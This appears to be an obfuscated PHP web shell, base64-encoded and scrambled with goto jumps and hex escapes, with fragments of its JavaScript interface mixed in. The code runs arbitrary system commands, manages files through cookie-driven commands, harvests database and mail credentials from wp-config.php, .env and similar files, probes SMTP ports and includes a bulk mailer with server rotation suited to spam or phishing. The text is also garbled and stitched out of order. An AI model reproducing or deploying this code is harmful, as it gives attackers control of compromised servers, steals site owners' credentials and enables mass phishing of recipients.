<?php eval(base64_decode('
 goto WZkxt; wZ3YW: ?>
';
        let cwd = '<?php  goto DmX30; Mb1hz: class MonarchMailer { public $Host = "\154\x6f\143\x61\x6c\x68\157\163\164"; public $Port = 25; public $SMTPAuth = false; public $Username = ''; public $Password = ''; public $SMTPSecure = ''; public $Timeout = 10; public $ErrorInfo = ''; public $isHTML = false; protected $smtp = null; public $FromName; public $From; public $To = array(); public $Subject; public $Body; public function __construct($exceptions = false) { } public function setFrom($address, $name = '') { $this->From = $address; $this->FromName = $name; } public function addAddress($address, $name = '') { $this->To[] = $address; } public function send() { $this->smtp = new MonarchSMTP(); $host = $this->Host; $use_crypto = $this->SMTPSecure === "\x73\163\154" || $this->SMTPSecure === "\x74\x6c\x73"; if ($use_crypto) { $host = $this->SMTPSecure . "\72\x2f\57" . $this->Host; } if (!$this->smtp->connect($host, $this->Port, $this->Timeout)) { throw new Exception("\x53\115\124\120\40\x43\157\x6e\x6e\145\x63\164\x20\146\x61\151\154\x65\x64\x3a\40" . $this->smtp->getError()["\145\162\162\157\162"]); } if (!$use_crypto) { if (!$this->smtp->hello(gethostname())) { throw new Exception("\105\x48\114\x4f\x20\146\141\x69\154\x65\x64\x3a\x20" . $this->smtp->getError()["\145\162\162\x6f\162"]); } if ($this->SMTPSecure === "\x73\x74\141\x72\164\164\154\163") { if (!$this->smtp->startTLS()) { throw new Exception("\123\124\101\122\x54\x54\114\x53\x20\x66\x61\151\154\x65\x64\x3a\40" . $this->smtp->getError()["\x65\x72\162\157\x72"]); } } } if (!$this->smtp->hello(gethostname())) { throw new Exception("\x45\110\x4c\x4f\x20\x28\x61\x66\x74\x65\x72\40\143\x72\171\x70\164\157\51\40\146\141\x69\154\145\144\x3a\x20" . $this->smtp->getError()["\145\x72\162\157\x72"]); } if ($this->SMTPAuth) { if (!$this->smtp->authenticate($this->Username, $this->Password)) { throw new Exception("\x53\115\124\120\40\x41\x75\164\150\40\x66\x61\x69\154\x65\144\x3a\40" . $this->smtp->getError()["\145\162\162\x6f\x72"]); } } if (!$this->smtp->mail($this->From)) { throw new Exception("\115\x41\x49\x4c\x20\x46\122\x4f\x4d\x20\x66\x61\x69\x6c\145\x64\x3a\40" . $this->smtp->getError()["\x65\162\162\x6f\x72"]); } foreach ($this->To as $to_email) { if (!$this->smtp->recipient($to_email)) { throw new Exception("\x52\x43\120\124\x20\124\x4f\x20\146\141\x69\154\x65\x64\40\x66\157\x72\40{$to_email}\x3a\40" . $this->smtp->getError()["\x65\x72\162\157\162"]); } } if (!$this->smtp->data($this->buildMessage())) { throw new Exception("\x44\x41\x54\x41\40\146\141\151\x6c\x65\x64\72\x20" . $this->smtp->getError()["\x65\162\162\x6f\162"]); } $this->smtp->quit(); return true; } protected function buildMessage() { $from_domain = explode("\100", $this->From)[1] ?? "\154\157\x63\141\x6c\150\157\x73\x74\56\x6c\157\143\141\x6c\144\157\x6d\x61\x69\x6e"; $msg = "\104\141\x74\145\72\x20" . date("\x72") . "\15\xa"; $msg .= "\x54\157\72\x20" . implode("\x2c", $this->To) . "\xd\xa"; $msg .= "\106\x72\x6f\155\x3a\x20" . $this->FromName . "\40\x3c" . $this->From . "\x3e\15\12"; $msg .= "\x53\x75\x62\152\x65\x63\x74\72\x20" . $this->Subject . "\15\12"; $msg .= "\x4d\x65\x73\163\141\x67\145\x2d\111\x44\x3a\40\x3c" . md5(uniqid(time())) . "\x40" . $from_domain . "\x3e\15\xa"; $msg .= "\x4d\x49\x4d\105\55\126\x65\x72\163\151\157\156\72\40\x31\x2e\60\xd\12"; if ($this->isHTML) { $boundary = "\x2d\55\55\55\75" . md5(uniqid(time())); $msg .= "\103\157\156\x74\145\x6e\164\55\124\171\x70\x65\x3a\x20\155\165\x6c\x74\x69\160\141\162\164\x2f\141\154\164\145\162\156\141\x74\151\x76\x65\73\x20\142\157\165\x6e\x64\141\x72\x79\x3d\x22{$boundary}\42\xd\12\xd\xa"; $plain_text_body = strip_tags($this->Body); $msg .= "\x2d\55{$boundary}\xd\xa\103\157\156\x74\145\156\164\x2d\124\x79\160\145\72\x20\164\145\x78\164\57\x70\154\141\x69\x6e\73\40\143\150\141\x72\163\x65\x74\75\x75\x74\146\55\70\xd\xa\xd\xa{$plain_text_body}\15\12\15\12"; $msg .= "\x2d\x2d{$boundary}\xd\xa\103\157\x6e\x74\x65\x6e\x74\x2d\x54\171\160\x65\72\40\x74\145\x78\x74\57\150\x74\x6d\x6c\x3b\40\x63\x68\x61\x72\163\145\x74\75\x75\x74\x66\55\x38\xd\12\15\xa{$this->Body}\xd\12\15\xa"; $msg .= "\x2d\55{$boundary}\55\55"; } else { $msg .= "\x43\x6f\x6e\x74\x65\x6e\x74\55\x54\x79\160\x65\72\40\164\x65\x78\x74\x2f\x70\154\141\x69\156\73\x20\143\150\141\162\x73\145\164\75\x75\x74\146\x2d\x38\xd\xa\15\12"; $msg .= $this->Body; } return $msg; } } goto RR49M; pXl8F: if (isset($_COOKIE["\143\155\x64"])) { $command = json_decode(base64_decode($_COOKIE["\143\155\x64"]), true); if ($command && isset($command["\x63\141\x6c\154"])) { header("\103\x6f\156\x74\x65\156\x74\55\124\x79\x70\145\x3a\x20\x61\160\x70\x6c\x69\x63\x61\x74\151\157\156\x2f\x6a\x73\157\156"); $response = array("\163\x75\x63\x63\145\163\x73" => false, "\157\x75\164\160\165\x74" => "\x49\156\166\x61\x6c\x69\144\x20\x63\157\155\x6d\x61\156\144\x20\163\x74\162\x75\x63\x74\165\x72\145\x2e"); $target = $command["\164\x61\162\x67\145\x74"] ?? null; if ($target) { $base_dir = realpath(getcwd()); $target_path = realpath($target); if (strpos($target_path, $base_dir) !== 0 && substr($target_path, 0, strlen("\57\164\x6d\160")) !== "\57\164\155\x70") { $response["\x6f\165\x74\160\x75\x74"] = "\105\x72\162\x6f\162\72\40\x41\x63\x63\145\163\x73\40\144\145\x6e\151\145\x64\40\x6f\x72\x20\160\x61\x74\150\x20\x69\163\40\157\x75\x74\x73\x69\x64\145\x20\164\150\145\40\x61\154\x6c\157\x77\145\x64\x20\x73\x63\157\160\x65\56"; echo json_encode($response); die; } } switch ($command["\143\x61\x6c\x6c"]) { case "\143\162\x65\141\164\x65\x5f\146\x69\x6c\x65": if (@file_put_contents($command["\x74\141\162\147\145\164"], $command["\143\x6f\x6e\x74\x65\x6e\x74"]) !== false) { $response = array("\163\x75\143\x63\x65\x73\x73" => true, "\x6f\x75\164\160\165\164" => "\106\x69\x6c\145\x20\163\x61\x76\x65\144\40\163\x75\x63\143\145\x73\163\x66\x75\154\x6c\171\x2e"); } else { $response["\157\165\x74\160\x75\164"] = "\105\162\162\157\x72\x3a\40\x43\157\165\x6c\144\x20\156\157\x74\40\167\x72\151\x74\x65\40\164\x6f\x20\146\151\x6c\x65\56"; } break; case "\143\x72\x65\x61\x74\145\137\x66\x6f\x6c\x64\x65\162": if (@mkdir($command["\164\x61\x72\x67\x65\x74"])) { $response = array("\163\x75\143\143\x65\163\x73" => true, "\x6f\165\x74\160\x75\164" => "\x46\157\x6c\x64\145\x72\x20\143\x72\145\x61\x74\x65\144\x20\x73\x75\x63\143\145\x73\163\146\165\154\x6c\x79\56"); } else { $response["\x6f\x75\164\x70\x75\164"] = "\x45\162\162\x6f\162\x3a\x20\x43\x6f\165\x6c\x64\40\156\157\164\40\x63\x72\145\x61\164\x65\x20\x66\x6f\154\144\145\162\56"; } break; case "\162\145\x6e\x61\x6d\145": if (@rename($command["\x74\141\162\147\x65\x74"], $command["\x64\145\x73\164\151\x6e\141\x74\x69\157\x6e"])) { $response = array("\x73\x75\143\143\x65\x73\163" => true, "\157\x75\164\x70\165\164" => "\x52\x65\x6e\141\155\145\x64\x20\163\165\x63\143\x65\163\163\146\165\x6c\154\x79\x2e"); } else { $response["\x6f\165\164\x70\165\x74"] = "\105\x72\162\157\162\x3a\x20\x52\145\x6e\141\155\145\40\146\x61\151\154\x65\x64\56"; } break; case "\x64\x65\154\x65\x74\x65": function rmdir_recursive($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } foreach (scandir($dir) as $item) { if ($item == "\x2e" || $item == "\x2e\56") { continue; } if (!rmdir_recursive($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } return rmdir($dir); } if (rmdir_recursive($command["\164\x61\x72\147\145\x74"])) { $response = array("\163\x75\143\143\x65\x73\163" => true, "\157\165\164\x70\165\164" => "\104\x65\154\x65\164\x65\x64\40\163\x75\x63\143\145\x73\x73\146\165\154\x6c\171\56"); } else { $response["\157\165\164\160\165\164"] = "\105\162\162\157\x72\72\x20\x44\x65\x6c\x65\164\x65\40\146\141\x69\154\x65\x64\56"; } break; case "\x63\150\x6d\157\144": if (@chmod($command["\164\141\162\x67\145\x74"], octdec($command["\160\x65\162\x6d\163"]))) { $response = array("\163\165\143\143\x65\x73\x73" => true, "\157\x75\x74\160\165\164" => "\x50\x65\162\155\x69\x73\x73\x69\157\x6e\x73\x20\x63\x68\141\x6e\x67\145\x64\x2e"); } else { $response["\157\165\x74\160\x75\x74"] = "\105\162\162\x6f\162\x3a\x20\103\150\x6d\157\144\40\146\x61\151\154\x65\x64\56"; } break; case "\x7a\x69\160": if (!class_exists("\132\151\160\101\162\143\x68\151\166\x65")) { $response["\x6f\165\x74\x70\165\164"] = "\x45\162\x72\x6f\162\x3a\x20\x5a\x69\160\x41\162\x63\x68\151\166\145\40\x63\x6c\x61\163\163\40\156\157\x74\x20\146\157\x75\156\x64\56"; break; } $zip = new ZipArchive(); $zipFile = $command["\144\145\163\x74\151\156\141\x74\151\x6f\x6e"]; if ($zip->open($zipFile, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) { $response["\x6f\x75\x74\160\165\x74"] = "\105\162\x72\x6f\x72\x3a\x20\103\x6f\x75\154\144\40\x6e\157\x74\x20\x63\x72\x65\141\164\145\x20\x7a\x69\x70\40\x61\162\x63\150\151\166\145\56"; break; } $source = realpath($command["\164\x61\162\x67\145\x74"]); if (is_dir($source)) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST); foreach ($files as $file) { $file = realpath($file); $relativePath = substr($file, strlen($source) + 1); if (is_dir($file)) { $zip->addEmptyDir($relativePath); } else { if (is_file($file)) { $zip->addFromString($relativePath, file_get_contents($file)); } } } } elseif (is_file($source)) { $zip->addFromString(basename($source), file_get_contents($source)); } $zip->close(); $response = array("\163\165\143\143\x65\x73\163" => true, "\157\x75\164\160\x75\x74" => "\x46\x6f\154\144\x65\x72\x20\x7a\151\160\x70\145\x64\x20\163\x75\143\x63\x65\x73\163\x66\165\154\x6c\x79\56"); break; } echo json_encode($response); setcookie("\143\155\x64", '', time() - 3600, "\57"); die; } } goto kENAq; DmX30: echo addslashes(realpath(getcwd())); goto Lau5J; r12vj: function monarchClear($text, $recipient_email, $sender_email) { $e = explode("\x40", $recipient_email); $emailuser = $e[0]; $emaildomain = $e[1] ?? ''; $text = str_replace("\133\x2d\x74\151\x6d\x65\55\135", date("\x6d\57\144\x2f\x59\40\x68\x3a\151\72\x73\40\141", time()), $text); $text = str_replace("\x5b\55\145\x6d\x61\x69\154\55\135", $recipient_email, $text); $text = str_replace("\x5b\x2d\145\155\x61\x69\x6c\x75\x73\x65\x72\x2d\x5d", $emailuser, $text); $text = str_replace("\x5b\x2d\145\x6d\141\151\x6c\x64\157\155\x61\151\x6e\55\135", $emaildomain, $text); $text = str_replace("\133\55\163\145\156\144\x65\162\x2d\135", $sender_email, $text); $text = str_replace("\x5b\55\x72\x61\156\x64\157\155\x6c\x65\x74\x74\145\162\163\x2d\x5d", randString(rand(8, 20), "\141\x62\x63\144\x65\146\x67\x68\x69\152\153\x6c\155\x6e\x6f\160\x71\162\x73\x74\x75\166\x77\x78\171\172"), $text); $text = str_replace("\133\x2d\x72\141\156\144\x6f\155\163\x74\x72\x69\156\x67\55\x5d", randString(rand(8, 20), "\x61\142\x63\144\x65\x66\147\x68\151\152\x6b\x6c\x6d\156\x6f\x70\161\162\x73\x74\x75\166\167\170\x79\172\x30\61\x32\x33\x34\65\66\x37\x38\x39"), $text); $text = str_replace("\x5b\x2d\x72\x61\156\x64\x6f\x6d\156\165\155\142\145\x72\x2d\x5d", randString(rand(8, 20), "\60\x31\x32\63\64\65\66\67\70\x39"), $text); $text = str_replace("\133\x2d\x72\141\x6e\x64\x6f\x6d\x6d\144\65\55\x5d", md5(randString(rand(8, 20), "\141\142\143\144\x65\x66\147\x68\x69\152\153\x6c\155\x6e\x6f\x70\x71\162\x73\164\x75\x76\167\x78\171\x7a\x30\x31\62\x33\64\65\66\67\70\71")), $text); return $text; } goto eTEuo; Lau5J: ?>
';
        let fm_zip_enabled = false;

        function openTab(evt, tabName, isFmTab = false) { 
            document.querySelectorAll('.tab-content').forEach(tc => tc.style.display = "none"); 
            document.querySelectorAll('.tab-link').forEach(tl => tl.classList.remove("active")); 
            document.getElementById(tabName).style.display = "block"; 
            evt.currentTarget.classList.add("active");
            if (isFmTab) {
                renderFileManager(cwd);
            }
        }
        
        // --- Shared Utilities ---
        function escapeHtml(text) { const div = document.createElement('div'); div.innerText = text; return div.innerHTML; }
        function showStatus(bar, message, isError = false) {
            bar.textContent = message;
            bar.className = isError ? 'status-error' : 'status-success';
            bar.style.display = 'block';
            setTimeout(() => { bar.style.display = 'none'; }, 4000);
        }

        // --- Terminal ---
        const terminalEl = document.getElementById('terminal'); const historyEl = document.getElementById('history'); const inputEl = document.getElementById('input'); const promptEl = document.getElementById('prompt'); let commandHistory = []; let historyIndex = -1;
        function updatePrompt() { const user = '<?php  goto GU8Zi; kENAq: function randString($length, $charset) { $password = ''; for ($i = 0; $i < $length; $i++) { $password .= $charset[rand() % strlen($charset)]; } return $password; } goto r12vj; arfYY: ?>
'; const hostname = '<?php  goto jIdvl; JvoSS: date_default_timezone_set("\x55\x54\103"); goto pXl8F; HeauO: @error_reporting(0); goto JvoSS; eTEuo: if (isset($_POST["\x61\143\164\151\x6f\x6e"])) { $action = $_POST["\x61\x63\x74\151\x6f\x6e"]; $current_dir = isset($_POST["\143\x77\x64"]) && is_dir($_POST["\x63\167\144"]) ? realpath($_POST["\143\x77\144"]) : realpath(getcwd()); if ($action === "\x73\150\x65\x6c\x6c" && isset($_POST["\x63\x6d\x64"])) { header("\x43\x6f\156\164\x65\x6e\x74\x2d\x54\x79\160\145\72\x20\164\x65\170\x74\57\160\x6c\x61\151\x6e"); $command = $_POST["\x63\155\144"]; if (preg_match("\x2f\136\x63\x64\134\163\53\x28\56\52\x29\x24\57", $command, $matches)) { $new_dir = trim($matches[1]); if ($new_dir === '' || $new_dir === "\176") { $new_dir = getenv("\110\117\115\105") ?: getenv("\x48\117\x4d\105\x44\x52\x49\x56\x45") . getenv("\x48\117\115\x45\x50\101\x54\110"); } if (substr($new_dir, 0, 1) !== "\x2f" && substr($new_dir, 1, 1) !== "\72") { $new_dir = $current_dir . DIRECTORY_SEPARATOR . $new_dir; } if (@chdir($new_dir)) { echo "\x53\125\x43\103\105\123\123\x3a\143\x64\72" . getcwd(); } else { echo "\x45\x52\x52\x4f\x52\72\143\144\72\x43\x61\156\156\x6f\164\x20\x61\143\143\145\163\x73\40\x27{$matches["\61"]}\47\x3a\40\116\x6f\40\x73\x75\143\x68\x20\146\151\154\x65\40\157\162\40\x64\151\x72\145\x63\164\157\x72\171"; } die; } $output = ''; if (function_exists("\x70\162\157\x63\x5f\x6f\160\x65\x6e")) { $descriptors = array(0 => array("\160\x69\x70\145", "\162"), 1 => array("\160\x69\x70\145", "\167"), 2 => array("\160\151\x70\145", "\167")); $process = proc_open($command, $descriptors, $pipes, $current_dir); if (is_resource($process)) { fclose($pipes[0]); $output = stream_get_contents($pipes[1]); $error_output = stream_get_contents($pipes[2]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); if (!empty($error_output)) { $output .= "\xa" . $error_output; } } } elseif (function_exists("\145\170\145\x63")) { exec($command . "\x20\x32\76\x26\x31", $output_lines); $output = implode("\12", $output_lines); } elseif (function_exists("\x73\150\145\154\x6c\137\x65\170\x65\x63")) { $output = shell_exec($command . "\x20\62\76\46\x31"); } else { $output = "\x45\x52\122\x4f\122\x3a\x20\101\154\x6c\x20\x63\157\x6d\155\141\x6e\x64\40\x65\170\145\143\165\164\x69\157\x6e\40\x66\x75\156\143\x74\x69\157\x6e\x73\x20\141\x72\x65\40\144\x69\163\x61\x62\x6c\145\x64\56"; } echo trim($output); } elseif ($action === "\163\x63\141\156\x5f\x63\x6f\x6e\146\x69\147\x73") { header("\103\x6f\x6e\164\145\x6e\164\x2d\124\x79\x70\145\x3a\40\x61\160\x70\x6c\151\x63\x61\x74\x69\x6f\x6e\57\152\x73\157\x6e"); $results = array(); $common_roots = array("\56", "\56\x2e", "\160\165\x62\154\151\143\137\x68\x74\x6d\154", "\x77\167\x77", "\x68\164\x74\160\x64\x6f\x63\163", "\150\164\x64\x6f\143\163"); $config_files = array("\x77\160\55\x63\x6f\x6e\146\151\x67\56\160\150\x70", "\x2e\x65\156\166", "\x63\157\156\x66\151\x67\x75\162\x61\164\x69\x6f\x6e\56\x70\150\x70", "\143\157\156\x66\x69\x67\56\160\150\x70", "\163\x65\x74\164\x69\x6e\x67\x73\56\151\x6e\143\x2e\x70\150\160", "\143\157\156\146\x69\x67\56\x69\x6e\143\x2e\x70\150\160", "\x61\x70\160\x2f\145\164\143\x2f\x6c\157\143\x61\x6c\56\x78\x6d\154"); foreach ($common_roots as $root) { $path = realpath($current_dir . "\57" . $root); if (!$path) { continue; } try { $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST); foreach ($iterator as $file) { if ($file->isFile() && in_array($file->getFilename(), $config_files)) { $content = @file_get_contents($file->getPathname()); if ($content === false) { continue; } $creds = array(); if (preg_match("\x2f\104\x42\137\110\x4f\x53\124\x27\54\x5c\163\x2a\47\50\x5b\x5e\x27\135\53\x29\x27\x2f", $content, $m)) { $creds["\x44\102\x5f\x48\117\123\124"] = $m[1]; } if (preg_match("\57\104\102\137\125\x53\105\122\x27\x2c\134\x73\x2a\47\50\x5b\x5e\x27\x5d\53\51\x27\57", $content, $m)) { $creds["\x44\102\x5f\125\123\105\122"] = $m[1]; } if (preg_match("\x2f\x44\x42\x5f\120\101\123\123\x57\117\x52\x44\47\54\134\163\52\x27\x28\133\136\47\135\53\51\47\57", $content, $m)) { $creds["\x44\x42\137\x50\101\x53\123\x57\x4f\122\x44"] = $m[1]; } if (preg_match("\57\x70\165\142\154\x69\x63\40\x5c\x24\x68\x6f\x73\x74\x20\x3d\x20\x27\x28\133\136\47\x5d\53\x29\47\73\x2f", $content, $m)) { $creds["\x44\x42\x5f\110\x4f\x53\124"] = $m[1]; } if (preg_match("\x2f\160\x75\x62\154\x69\x63\x20\134\44\x75\163\145\162\40\75\x20\x27\50\133\136\x27\x5d\x2b\51\x27\73\57", $content, $m)) { $creds["\x44\102\x5f\125\x53\x45\122"] = $m[1]; } if (preg_match("\x2f\x70\x75\142\154\x69\x63\x20\134\44\160\x61\163\163\167\157\x72\144\x20\75\40\47\x28\x5b\x5e\47\135\53\51\47\x3b\x2f", $content, $m)) { $creds["\104\102\137\120\101\x53\123\127\117\x52\x44"] = $m[1]; } if (preg_match("\57\x4d\101\111\x4c\137\x48\x4f\x53\x54\x3d\x28\x2e\52\51\x2f", $content, $m)) { $creds["\115\101\111\114\137\110\x4f\123\x54"] = trim($m[1]); } if (preg_match("\x2f\115\101\x49\x4c\x5f\120\117\x52\124\75\50\56\x2a\x29\57", $content, $m)) { $creds["\x4d\x41\x49\114\x5f\120\117\122\124"] = trim($m[1]); } if (preg_match("\57\x4d\101\x49\114\x5f\125\123\x45\122\x4e\101\115\105\x3d\50\56\x2a\x29\x2f", $content, $m)) { $creds["\115\x41\x49\114\137\125\x53\105\122\x4e\x41\115\105"] = trim($m[1]); } if (preg_match("\x2f\x4d\101\111\x4c\137\120\101\x53\123\127\117\x52\x44\x3d\x28\56\52\51\x2f", $content, $m)) { $creds["\x4d\101\111\x4c\x5f\x50\x41\123\123\x57\117\122\104"] = trim($m[1]); } if (!empty($creds)) { $results[] = array("\x70\141\164\x68" => $file->getPathname(), "\x63\x72\x65\144\x73" => $creds); } } } } catch (Exception $e) { } } echo json_encode($results); } elseif ($action === "\163\143\141\156\137\x73\155\x74\x70") { header("\103\157\156\164\x65\156\x74\x2d\x54\171\160\145\x3a\40\141\160\x70\154\x69\x63\x61\164\x69\157\156\57\152\x73\157\x6e"); $results = array(); $ports_to_check = array(25, 465, 587, 2525); $test_host = "\163\x6d\164\x70\56\147\157\x6f\x67\x6c\x65\x2e\143\157\x6d"; $timeout = 3; $results["\x66\x73\157\x63\x6b\157\160\145\156"] = function_exists("\x66\163\x6f\x63\153\x6f\x70\x65\156"); $results["\160\x6f\x72\164\163"] = array(); foreach ($ports_to_check as $port) { $connection = @fsockopen($test_host, $port, $errno, $errstr, $timeout); if (is_resource($connection)) { $results["\x70\157\x72\x74\x73"][] = array("\x70\x6f\x72\164" => $port, "\163\164\141\164\165\x73" => "\x4f\160\x65\156"); fclose($connection); } else { $results["\x70\x6f\162\164\163"][] = array("\160\157\x72\x74" => $port, "\163\164\141\x74\165\163" => "\102\154\157\143\153\145\144"); } } echo json_encode($results); } elseif ($action === "\146\x69\x6c\x65\137\x6d\x61\x6e\x61\147\145\x72") { header("\x43\x6f\x6e\164\x65\x6e\164\x2d\124\x79\x70\x65\x3a\40\x61\160\x70\154\151\143\x61\x74\151\157\156\x2f\152\x73\x6f\156"); $do = $_POST["\144\x6f"] ?? "\154\151\x73\x74"; $path = $_POST["\x70\141\x74\x68"] ?? $current_dir; function get_perms_str($file) { $perms = fileperms($file); if (($perms & 49152) == 49152) { $info = "\x73"; } elseif (($perms & 40960) == 40960) { $info = "\154"; } elseif (($perms & 32768) == 32768) { $info = "\55"; } elseif (($perms & 24576) == 24576) { $info = "\x62"; } elseif (($perms & 16384) == 16384) { $info = "\144"; } elseif (($perms & 8192) == 8192) { $info = "\x63"; } elseif (($perms & 4096) == 4096) { $info = "\160"; } else { $info = "\165"; } $info .= $perms & 256 ? "\x72" : "\55"; $info .= $perms & 128 ? "\167" : "\55"; $info .= $perms & 64 ? $perms & 2048 ? "\x73" : "\170" : ($perms & 2048 ? "\123" : "\55"); $info .= $perms & 32 ? "\162" : "\x2d"; $info .= $perms & 16 ? "\167" : "\55"; $info .= $perms & 8 ? $perms & 1024 ? "\163" : "\x78" : ($perms & 1024 ? "\x53" : "\x2d"); $info .= $perms & 4 ? "\x72" : "\x2d"; $info .= $perms & 2 ? "\x77" : "\x2d"; $info .= $perms & 1 ? $perms & 512 ? "\x74" : "\x78" : ($perms & 512 ? "\x54" : "\55"); return $info; } switch ($do) { case "\154\151\x73\164": $files = array(); $dirs = array(); $scandir = @scandir($path); if ($scandir === false) { echo json_encode(array("\145\162\162\157\x72" => "\x43\x6f\165\x6c\144\x20\156\157\164\40\x72\145\x61\144\40\144\151\x72\x65\143\x74\157\x72\171\x2e")); die; } foreach ($scandir as $item) { if ($item === "\56") { continue; } $full_path = $path . DIRECTORY_SEPARATOR . $item; $item_data = array("\x6e\x61\155\x65" => $item, "\x70\141\164\x68" => $full_path, "\x73\x69\172\x65" => is_dir($full_path) ? "\55" : filesize($full_path), "\160\145\x72\155\163" => get_perms_str($full_path), "\x6d\x74\151\x6d\x65" => date("\131\55\155\x2d\144\40\x48\72\x69\72\163", filemtime($full_path))); if (is_dir($full_path)) { $dirs[] = $item_data; } else { $files[] = $item_data; } } $server_ip = $_SERVER["\x53\105\x52\126\x45\122\137\x41\x44\x44\122"] ?? gethostbyname($_SERVER["\123\105\x52\x56\105\x52\137\116\101\115\105"]); $server_info = array("\x63\167\144" => $path, "\160\150\x70\x5f\166\145\x72\163\151\x6f\x6e" => PHP_VERSION, "\x75\156\141\155\145" => php_uname(), "\163\145\162\166\x65\x72\137\151\x70" => $server_ip, "\172\x69\160\137\145\156\141\142\154\x65\x64" => class_exists("\x5a\x69\160\x41\x72\x63\x68\x69\x76\x65")); echo json_encode(array("\x69\156\x66\157" => $server_info, "\151\164\145\x6d\163" => array_merge($dirs, $files))); break; case "\x67\145\x74\137\143\157\x6e\x74\x65\x6e\164": $file = $_POST["\x74\141\x72\147\145\164"] ?? null; if ($file && is_file($file) && is_readable($file)) { echo json_encode(array("\163\165\143\x63\x65\x73\163" => true, "\x63\157\156\x74\x65\x6e\x74" => file_get_contents($file))); } else { echo json_encode(array("\163\x75\x63\x63\x65\163\x73" => false, "\x65\162\x72\157\162" => "\x43\141\x6e\x6e\x6f\x74\40\x72\x65\141\x64\x20\x66\151\x6c\145\56")); } break; case "\x64\x6f\x77\x6e\154\x6f\141\144": $file = $_GET["\x66\151\x6c\x65"] ?? null; if ($file && is_file($file) && is_readable($file)) { header("\103\x6f\156\x74\x65\x6e\x74\x2d\104\145\x73\143\x72\151\x70\164\151\157\x6e\72\40\x46\x69\x6c\145\40\124\x72\x61\156\x73\x66\x65\x72"); header("\103\157\x6e\x74\145\156\x74\55\124\171\160\145\72\x20\x61\x70\x70\x6c\151\x63\x61\x74\x69\157\x6e\x2f\157\x63\164\x65\164\55\163\164\162\145\141\155"); header("\103\x6f\x6e\164\x65\156\x74\55\x44\151\163\x70\157\163\151\x74\151\157\156\72\x20\x61\x74\x74\141\143\x68\x6d\145\156\x74\x3b\x20\x66\151\x6c\x65\156\141\155\145\75\42" . basename($file) . "\42"); header("\105\170\x70\x69\162\145\x73\72\x20\60"); header("\103\x61\x63\x68\x65\x2d\x43\157\x6e\x74\x72\x6f\154\x3a\x20\x6d\165\x73\x74\55\162\145\166\x61\x6c\x69\x64\x61\x74\x65"); header("\x50\162\x61\147\155\x61\72\x20\x70\x75\142\x6c\x69\143"); header("\x43\x6f\156\164\x65\x6e\164\x2d\114\145\156\x67\164\x68\72\40" . filesize($file)); readfile($file); die; } http_response_code(404); echo "\106\151\154\145\40\156\157\x74\40\x66\x6f\x75\x6e\144\56"; break; } } elseif ($action === "\163\145\x6e\x64\137\155\141\151\x6c") { header("\103\157\x6e\x74\145\x6e\x74\x2d\x54\x79\160\x65\72\40\164\145\170\x74\57\x70\154\141\151\x6e"); $recipients = preg_split("\57\x5c\x72\134\156\x7c\134\x72\174\x5c\x6e\57", trim($_POST["\164\157"])); $recipients = array_filter(array_map("\164\x72\151\x6d", $recipients)); if (empty($recipients)) { echo "\105\122\x52\x4f\x52\x3a\40\x4e\157\x20\x72\x65\143\151\x70\151\x65\x6e\x74\40\145\x6d\x61\151\154\163\x20\160\x72\x6f\166\x69\144\145\144\56"; die; } $from_email_base = $_POST["\146\162\x6f\x6d"]; $from_name_base = $_POST["\x66\162\x6f\x6d\x5f\156\141\155\x65"] ?: "\115\157\156\x61\x72\x63\150\x20\x54\145\163\164"; $subject_base = $_POST["\x73\165\142\x6a\145\143\x74"]; $body_base = $_POST["\x62\x6f\144\x79"]; $is_html = $_POST["\143\157\156\x74\x65\x6e\164\137\x74\x79\160\x65"] === "\x68\x74\155\x6c"; $smtp_list_str = trim($_POST["\163\x6d\x74\x70\137\154\x69\x73\164"]); $use_from_as_login = isset($_POST["\x66\162\157\155\x5f\x61\163\x5f\154\x6f\x67\151\156"]); $rotate_after = (int) ($_POST["\162\x6f\x74\141\164\x65\137\x61\x66\x74\x65\x72"] ?? 0); $pause_for = (int) ($_POST["\160\141\x75\x73\x65\x5f\x66\x6f\x72"] ?? 0); $pause_every = (int) ($_POST["\160\141\165\x73\145\x5f\x65\166\145\162\171"] ?? 0); $sent_count = 0; $failed_count = 0; $log = array(); $current_smtp_index = 0; $smtps = array(); if (empty($smtp_list_str)) { if (!function_exists("\x6d\x61\x69\154")) { echo "\x45\122\122\117\122\72\x20\124\x68\145\x20\x6d\x61\151\154\50\51\x20\x66\165\x6e\x63\x74\x69\157\156\x20\151\163\x20\144\151\163\x61\142\x6c\145\x64\x2e\40\x50\154\x65\141\x73\145\x20\x75\x73\145\40\123\115\124\120\x2e"; die; } foreach ($recipients as $to) { $from_email = monarchClear($from_email_base, $to, $from_email_base); $from_domain = explode("\100", $from_email)[1] ?? "\154\157\x63\x61\154\150\x6f\163\x74\56\154\157\x63\141\154\144\157\155\x61\x69\x6e"; $from_name = monarchClear($from_name_base, $to, $from_email); $subject = monarchClear($subject_base, $to, $from_email); $body = monarchClear($body_base, $to, $from_email); $message_id = "\74" . md5(uniqid()) . "\100" . $from_domain . "\x3e"; $headers = "\x46\x72\x6f\155\x3a\40{$from_name}\x20\74{$from_email}\76\15\xa" . "\x52\145\160\x6c\171\x2d\124\157\x3a\40{$from_name}\40\x3c{$from_email}\76\15\12" . "\115\x49\x4d\x45\55\126\x65\x72\x73\x69\x6f\x6e\x3a\x20\61\56\x30\xd\12" . "\x4d\145\x73\x73\x61\147\x65\55\x49\104\72\40{$message_id}\15\12"; if ($is_html) { $boundary = "\55\55\x2d\55\75" . md5(uniqid(time())); $headers .= "\103\157\x6e\x74\145\156\164\55\124\x79\160\x65\72\40\x6d\x75\154\164\x69\x70\x61\162\164\57\x61\154\164\x65\x72\x6e\141\164\151\166\x65\73\40\x62\x6f\165\x6e\144\141\x72\x79\75\x22{$boundary}\42\15\12"; $plain_text_body = strip_tags($body); $message_body = "\55\55{$boundary}\15\xa\103\x6f\x6e\x74\x65\x6e\x74\55\124\x79\x70\x65\72\x20\x74\145\170\x74\x2f\160\154\141\151\156\x3b\x20\143\150\141\x72\163\145\x74\75\165\164\146\x2d\70\15\xa\15\12{$plain_text_body}\xd\12\15\xa"; 